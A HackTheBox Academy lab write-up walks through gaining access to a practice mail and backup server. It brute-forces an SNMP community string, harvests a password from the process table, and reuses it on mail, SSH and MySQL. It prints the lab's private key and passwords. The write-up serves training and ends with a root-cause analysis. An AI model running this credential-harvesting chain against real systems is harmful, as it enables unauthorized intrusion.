---
Platform: HackTheBox - Academy
Module: Footprinting
Lab: Footprinting Lab - Hard
Date: 2026 - 10 - 28
tags:
  - Lab
  - Academy
  - CPTS
  - Reconnaissance
  - Footprinting
  - SNMP
  - POP3
  - IMAP
  - SSH-Key
  - MySQL
  - Password-Reuse
  - Linux
---
## Description & Client Objective
> The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.
> 
> Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.

---

## Attack Path (Kill Chain)

```mermaid
flowchart LR
    A["Nmap UDP Scan (161)"] --> B["SNMP Community: backup"]
    B --> C["Process Leaks: tom's Creds"]
    C --> D["POP3 / IMAP Inbox"]
    D --> E["SSH Private Key (id_rsa)"]
    E --> F["SSH Shell as tom (22)"]
    F --> G["Local MySQL (.mysql_history)"]
    G --> H["HTB Password Extraction"]
```

---

## 1. Initial Reconnaissance & Port Scanning

Fast TCP port discovery:
```shell
sudo nmap -p- --min-rate=5000 $ip -Pn
```

### Open Ports & Services:
| Port      | State | Service | Notes                                                                                                                                         |
| :-------- | :---: | :------ | :-------------------------------------------------------------------------------------------------------------------------------------------- |
| `22/tcp`  | open  | ssh     | Remote administration shell. Attack scope: credential reuse from compromised mail accounts, SSH key harvesting, or password brute force.      |
| `110/tcp` | open  | pop3    | Cleartext POP3 protocol. Attack scope: banner grabbing, unencrypted credential sniffing, user enumeration, and password spraying without MFA. |
| `143/tcp` | open  | imap    | Cleartext IMAP protocol. Attack scope: plaintext authentication capture, directory/folder enumeration, and credential spraying.               |
| `993/tcp` | open  | imaps   | Encrypted IMAP over TLS/SSL. Attack scope: authenticated mailbox enumeration, searching stored emails for sensitive credentials or configs.   |
| `995/tcp` | open  | pop3s   | Encrypted POP3 over TLS/SSL. Attack scope: authenticated email retrieval and credential testing.                                              |
| `161/udp` | open  | snmp    | Net-SNMP daemon. Attack scope: community string brute force, system information disclosure, and running process parameter harvesting.       |

Because all discovered TCP services required credentials we did not yet possess, we pivoted to enumerating standard management UDP services:
```shell
sudo nmap -sU -p 161 -sV $ip
```
```shell
PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
```

---

## 2. Service Enumeration & Initial Foothold

### Investigation:
SNMP server is open to public, there are no any firewall. This allow us to brute force to find a valid `Community String` that could be used as a `credential` :

```shell
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip
```

Result : 
```shell
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

Bingo, we got a community string `backup` here. Let's use `SNMP walk` to walk into the server : 
```shell
snmpwalk -v2c -c backup $ip
```

Result : 
```shell
iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (166229) 0:27:42.29
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (12) 0:00:00.12
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (168123) 0:28:01.23
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 0A 1C 02 2B 21 00 2B 00 00
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 161
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

From the result above we got a credential : `tom:NMds732Js2761`, and many other banner which may be useful later

---

## 3. Privilege Escalation (PrivEsc)
### Vector Identified:
Since we've discovered a credential, let's try `password reuse` on IMAP/POP3 server : 

```shell
┌──(nus㉿master)-[~/HTB/WD]
└─$ curl -k 'imaps://10.129.202.20' --user tom:NMds732Js2761
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
┌──(nus㉿master)-[~/HTB/WD]
└─$ curl -k 'pop3://10.129.202.20' --user tom:NMds732Js2761
1 3661
```

From the information above, we know that `pop3` has one email within it, so let's find it out first : 
```shell
curl -k 'pop3://10.129.202.20/1' --user tom:NMds732Js2761
```

Result : 
```shell
HELO dev.inlanefreight.htb
MAIL FROM:<tech@dev.inlanefreight.htb>
RCPT TO:<bob@inlanefreight.htb>
DATA
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Date: Wed, 10 Nov 2010 14:21:26 +0200
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQqYreqEj6pjTj8wguR0Sd
hfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHFdND3urVhelyuQ89BtJqB
abmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/ong1nlguuJGc1s47tqKBP
HuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZISazgCz/D6IdVMXilAUFKQ
X1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06OqMb9StNGOnkqY8rIHPga
H/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtbDFv9M3j0SjsMTr2Q0B0O
jKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmpNrS7qSjxO0N143zMRDZy
Ex74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpAVj6YYkMDtL86RN6o8u1x
3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVeoYK9OJJ3hJeJ7SpCt2GG
cAAAdIRrOunEazrpwAAAAHc3NoLXJzYQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxy
U9XWTS+UBbY3lVFH0t+F+yuX+57Wo48pORqVAuMINrqxjxEPA7XMPR9XIsa60APplOSiQQ
qYreqEj6pjTj8wguR0SdhfKDOZwIQ1ILHecgJAA0zY2NwWmX5zVDDeIckjibxjrTvx7PHF
dND3urVhelyuQ89BtJqBabmrB5zzmaltTK0VuAxR/SFcVaTJNXd5Utw9SUk4/l0imjP3/o
ng1nlguuJGc1s47tqKBPHuJKqn5r6am5xgX5k4ct7VQOQbRJwaiQVA5iShrwZxX5wBnZIS
azgCz/D6IdVMXilAUFKQX1thi32f3jkylCb/DBzGRROCMgiD5Al+uccy9cm9aS6RLPt06O
qMb9StNGOnkqY8rIHPgaH/RjqDTSJbNab3w+CShlb+H/p9cWGxhIrII+lBTcpCUAIBbPtb
DFv9M3j0SjsMTr2Q0B0OjKENcSKSq1E1m8FDHqgpSY5zzyRi7V/WZxCXbv8lCgk5GWTNmp
NrS7qSjxO0N143zMRDZyEx74aYCx3aFIaIGFXT/EedRQ5l0cy7xVyM4wIIA+XlKR75kZpA
Vj6YYkMDtL86RN6o8u1x3txZv15lMtfG4jzztGwnVQiGscG0CWuUA+E1pGlBwfaswlomVe
oYK9OJJ3hJeJ7SpCt2GGcAAAADAQABAAACAQC0wxW0LfWZ676lWdi9ZjaVynRG57PiyTFY
jMFqSdYvFNfDrARixcx6O+UXrbFjneHA7OKGecqzY63Yr9MCka+meYU2eL+uy57Uq17ZKy
zH/oXYQSJ51rjutu0ihbS1Wo5cv7m2V/IqKdG/WRNgTFzVUxSgbybVMmGwamfMJKNAPZq2
xLUfcemTWb1e97kV0zHFQfSvH9wiCkJ/rivBYmzPbxcVuByU6Azaj2zoeBSh45ALyNL2Aw
HHtqIOYNzfc8rQ0QvVMWuQOdu/nI7cOf8xJqZ9JRCodiwu5fRdtpZhvCUdcSerszZPtwV8
uUr+CnD8RSKpuadc7gzHe8SICp0EFUDX5g4Fa5HqbaInLt3IUFuXW4SHsBPzHqrwhsem8z
tjtgYVDcJR1FEpLfXFOC0eVcu9WiJbDJEIgQJNq3aazd3Ykv8+yOcAcLgp8x7QP+s+Drs6
4/6iYCbWbsNA5ATTFz2K5GswRGsWxh0cKhhpl7z11VWBHrfIFv6z0KEXZ/AXkg9x2w9btc
dr3ASyox5AAJdYwkzPxTjtDQcN5tKVdjR1LRZXZX/IZSrK5+Or8oaBgpG47L7okiw32SSQ
5p8oskhY/He6uDNTS5cpLclcfL5SXH6TZyJxrwtr0FHTlQGAqpBn+Lc3vxrb6nbpx49MPt
DGiG8xK59HAA/c222dwQAAAQEA5vtA9vxS5n16PBE8rEAVgP+QEiPFcUGyawA6gIQGY1It
4SslwwVM8OJlpWdAmF8JqKSDg5tglvGtx4YYFwlKYm9CiaUyu7fqadmncSiQTEkTYvRQcy
tCVFGW0EqxfH7ycA5zC5KGA9pSyTxn4w9hexp6wqVVdlLoJvzlNxuqKnhbxa7ia8vYp/hp
6EWh72gWLtAzNyo6bk2YykiSUQIfHPlcL6oCAHZblZ06Usls2ZMObGh1H/7gvurlnFaJVn
CHcOWIsOeQiykVV/l5oKW1RlZdshBkBXE1KS0rfRLLkrOz+73i9nSPRvZT4xQ5tDIBBXSN
y4HXDjeoV2GJruL7qAAAAQEA/XiMw8fvw6MqfsFdExI6FCDLAMnuFZycMSQjmTWIMP3cNA
2qekJF44lL3ov+etmkGDiaWI5XjUbl1ZmMZB1G8/vk8Y9ysZeIN5DvOIv46c9t55pyIl5+
fWHo7g0DzOw0Z9ccM0lr60hRTm8Gr/Uv4TgpChU1cnZbo2TNld3SgVwUJFxxa//LkX8HGD
vf2Z8wDY4Y0QRCFnHtUUwSPiS9GVKfQFb6wM+IAcQv5c1MAJlufy0nS0pyDbxlPsc9HEe8
EXS1EDnXGjx1EQ5SJhmDmO1rL1Ien1fVnnibuiclAoqCJwcNnw/qRv3ksq0gF5lZsb3aFu
kHJpu34GKUVLy74QAAAQEA+UBQH/jO319NgMG5NKq53bXSc23suIIqDYajrJ7h9Gef7w0o
eogDuMKRjSdDMG9vGlm982/B/DWp/Lqpdt+59UsBceN7mH21+2CKn6NTeuwpL8lRjnGgCS
t4rWzFOWhw1IitEg29d8fPNTBuIVktJU/M/BaXfyNyZo0y5boTOELoU3aDfdGIQ7iEwth5
vOVZ1VyxSnhcsREMJNE2U6ETGJMY25MSQytrI9sH93tqWz1CIUEkBV3XsbcjjPSrPGShV/
H+alMnPR1boleRUIge8MtQwoC4pFLtMHRWw6yru3tkRbPBtNPDAZjkwF1zXqUBkC0x5c7y
XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

Bingo, we got tom's SSH key Credential. 
Before connecting, we also inspected the IMAP service to verify if other mail folders contained data:
```shell
# Authenticate to IMAP session:
a1 LOGIN tom NMds732Js2761

# Check INBOX:
a2 SELECT INBOX
a3 FETCH 1 BODY[]

# Check custom folders (all returned 0 EXISTS, confirming they are empty):
a4 SELECT Important
a5 SELECT Meetings
a6 SELECT Notes
```

---

## 4. Objective / Flag Extraction

### Execution Plan:
Save the extracted SSH private key to a local file (`key`), apply secure permissions (`chmod 600`), and connect as user `tom`:
```shell
chmod 600 key
ssh -i key tom@$ip
```

After successfully connected, i've tried to diving in, but i found something interesting from `.bash_history` : 
```shell
tom@NIXHARD:~$ cat .bash_history
mysql -u tom -p
ssh-keygen -t rsa -b 4096
ls
ls -al
cd .ssh/
ls
cd mail/
ls
ls -al
cd .imap/
ls
cd Important/
ls
set term=xterm
vim key
cat ~/.ssh/id_rsa
vim key
ls
mv key ..
cd ..
ls
mv key Important/
mv Important/key ../
cd ..
ls
ls -l
id
cat /etc/passwd
ls
cd mail/
ls
ls -al
cd mail/
ls
rm Meetings
rm TESTING Important
ls -l
cd ..
ls -al
mv mail/key Maildir/.Important/new/
mv Maildir/.Important/new/key Maildir/new/
cd Maildir/new/
ls
cd ..
tree .
cat cur/key
cd cur/
ls
ls -al
cat "key:2,"
mysql -u tom -p
mysql -u tom -p
```

Let's connect to the `mysql -u tom -p` we will reuse the password `NMds732Js2761` : 
```shell
SHOW databases;
#Let's use database users
USE users;
SHOW tables;
#It only contains one tables : users
SELECT * FROM users
WHERE username='HTB';
```

Result : 
```
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
```

Bingo, we've obtained the password of user `HTB`

---

# Flag / Proof : `cr3n4o7rzse7rzhnckhssncif7ds`

---

## 5. Why This Happened (Root Cause & Human Error)
* **Root Causes:**
  1. **Unrestricted SNMP Exposure:** SNMP (UDP port 161) was exposed to the network without firewall rules or IP whitelisting, allowing unauthenticated network probes.
  2. **Weak & Predictable Community String:** The service used a standard dictionary word (`backup`) as its SNMP community string instead of enforcing complex strings or migrating to SNMPv3 with encrypted authentication.
  3. **Credential Leakage in Process Arguments:** An administrative recovery script (`/opt/tom-recovery.sh`) was called with plaintext credentials passed directly as CLI parameters (`tom NMds732Js2761`), which were captured and leaked through the SNMP process table (`hrSWRunTable`).
  4. **Unencrypted SSH Key Transmission via Email:** An OpenSSH private key was emailed in cleartext to `tom@inlanefreight.htb` and left permanently in the mailbox without encryption or password protection.
  5. **Pervasive Password Reuse:** The user reused the same password (`NMds732Js2761`) across multiple internal services, enabling immediate access from email to the local MySQL database.
* **Business Impact:**
  - **Account Database Compromise:** Unauthorized access to the central `users` database, exposing employee and service account passwords (including the client's proof user `HTB`).
  - **Internal Host Takeover:** Unauthorized interactive SSH shell access to an internal MX and backup management host.

---

## 6. Key Takeaways & Lessons Learned
* **New Concepts Learned:**
  - **UDP Reconnaissance in Footprinting:** When TCP service enumeration hits a dead end (all ports locked behind authentication), scanning standard UDP management ports (specifically SNMP UDP 161) is critical.
  - **SNMP Information Gathering:** Using `onesixtyone` for community string discovery and `snmpwalk` to extract process parameters and leaked credentials from system MIBs.
  - **Mail Protocol Differences (POP3 vs. IMAP):** POP3 accesses only the primary `INBOX`, while IMAP supports hierarchical folder navigation (`SELECT`, `FETCH`).
  - **Post-Exploitation Footprinting via History Files:** Checking `.bash_history` and `.mysql_history` immediately reveals local databases, table names, and past commands executed by the user.
* **Rabbit Holes Avoided:**
  - **Forcing SSH or Dovecot Brute-Forcing:** Avoided noisy and low-probability password guessing by enumerating SNMP first.
  - **Mistaking `~/mail/.imap/Important/key` for a Private Key:** Recognized that internal IMAP cache files contain keyword and timestamp metadata, not cryptographic keys.
  - **Attempting Sudo Elevation for MySQL:** Recognized that user `tom` was not in `sudoers`, effectively using direct password reuse into the MySQL server client instead.

---

## Related Concepts : 
[[onesixtyone]], [[snmpwalk]], [[Nmap]], [[_Network Commands]], [[_Linux CLI Commands]], [[SQL Syntax & Footprinting]], [[_Offensive Tools]]
